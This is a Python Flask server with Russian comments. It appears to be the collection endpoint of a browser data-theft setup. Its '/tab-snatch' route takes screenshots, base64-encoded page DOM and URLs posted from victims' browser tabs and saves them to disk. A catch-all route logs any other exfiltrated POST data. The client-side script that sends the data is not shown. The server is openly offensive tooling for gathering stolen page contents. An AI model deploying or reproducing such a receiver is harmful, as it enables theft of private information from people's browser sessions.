from flask import Flask, request
import base64
import time
import os
import json

app = Flask(__name__)

SAVE_DIR = "results"
os.makedirs(SAVE_DIR, exist_ok=True)

def now_str():
    # YYYYMMDD_HHMMSS для уникальных имён
    return time.strftime("%Y%m%d_%H%M%S")

def save_screenshot(data_url, prefix="screenshot"):
    # data_url — строка вида "data:image/png;base64,..."
    try:
        if not data_url.startswith("data:image/png;base64,"):
            print("Некорректный формат скриншота!")
            return None
        b64data = data_url.split(",", 1)[1]
        ts = now_str()
        filename = f"{prefix}_{ts}.png"
        path = os.path.join(SAVE_DIR, filename)
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64data))
        return filename
    except Exception as e:
        print("Ошибка при сохранении скриншота:", e)
        return None

def save_dom(dom_b64, prefix="dom"):
    try:
        ts = now_str()
        filename = f"{prefix}_{ts}.html"
        path = os.path.join(SAVE_DIR, filename)
        dom = base64.b64decode(dom_b64).decode("utf-8", errors="replace")
        with open(path, "w", encoding="utf-8") as f:
            f.write(dom)
        return filename
    except Exception as e:
        print("Ошибка при сохранении DOM:", e)
        return None

@app.route('/tab-snatch', methods=['POST'])
def tab_snatch():
    data = request.get_json(force=True)
    print(f"[tab-snatch] Received at {now_str()}: {data.get('url', '')}")

    saved = {}

    if "screenshot" in data:
        fname = save_screenshot(data["screenshot"])
        if fname: saved["screenshot"] = fname

    if "dom_b64" in data:
        fname = save_dom(data["dom_b64"])
        if fname: saved["dom"] = fname

    # (опционально) сохраняем метаданные
    meta_fname = f"meta_{now_str()}.json"
    with open(os.path.join(SAVE_DIR, meta_fname), "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    print("Saved files:", saved)
    return "OK", 200

@app.route('/<path:endpoint>', methods=['POST'])
def catch_all(endpoint):
    data = request.get_json(force=True)
    print(f"[{endpoint}] Received at {now_str()}: {data}")
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
